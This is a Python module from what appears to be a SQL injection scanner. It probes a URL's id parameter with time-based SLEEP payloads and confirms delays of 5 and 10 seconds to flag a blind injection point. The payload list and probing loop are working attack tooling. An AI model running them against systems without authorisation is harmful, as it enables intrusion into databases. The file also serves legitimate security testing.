from Modules.URLUtils import construct_test_url
from Modules.RequestHandler import send_payload
import time

time_based_payloads = [" AND SLEEP({})", "' AND SLEEP({})%23", '" AND SLEEP({})%23']


def test_time_based_sql_injection(target_url, id_value):

    # Test: Check for Time-based vulnerabilities
    print("\nTesting with Time-based conditions:")
    for payload in time_based_payloads:
        formatted_payload = payload.format(5)  # Initial test with 5 seconds delay
        new_url = construct_test_url(target_url, id_value, formatted_payload)
        start_time = time.time()
        send_payload(new_url)
        response_time = time.time() - start_time

        # Confirm the response time and re-test with a longer delay
        if response_time >= 5:  # Initial confirmation
            print(f"Initial confirmation: Payload {formatted_payload} caused a significant delay.")
            # Re-test with a longer delay to double-check
            formatted_payload = payload.format(10)  # Re-test with 10 seconds
            new_url = construct_test_url(target_url, id_value, formatted_payload)
            start_time = time.time()
            send_payload(new_url)
            response_time = time.time() - start_time
            if response_time >= 10:
                print(
                    f"Confirmed: Payload '{formatted_payload}' caused a significant delay (likely vulnerable to "
                    f"time-based injection).")
                return "time-based", formatted_payload

    # If no vulnerabilities found, return None
    return None, None
